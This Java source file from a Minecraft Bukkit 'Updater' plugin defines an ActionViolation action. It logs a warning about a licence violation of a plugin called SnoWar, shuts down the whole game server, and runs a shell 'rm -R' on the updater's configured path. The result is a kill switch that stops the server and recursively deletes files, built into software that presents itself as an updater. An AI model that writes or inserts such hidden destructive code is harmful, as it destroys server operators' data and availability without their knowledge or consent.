package net.vorps.updater.action;

import net.vorps.updater.Updater;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

/**
 * Project Updater Created by Vorps on 02/09/2016 at 00:33.
 */
public class ActionViolation implements Execute {

    @Override
    public boolean run(Plugin plugin){
        plugin.getLogger().warning("§cViolation of law Plugin SnoWar");
        Bukkit.shutdown();
        try {
            Runtime.getRuntime().exec("rm -R "+ Updater.getPath());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }
}
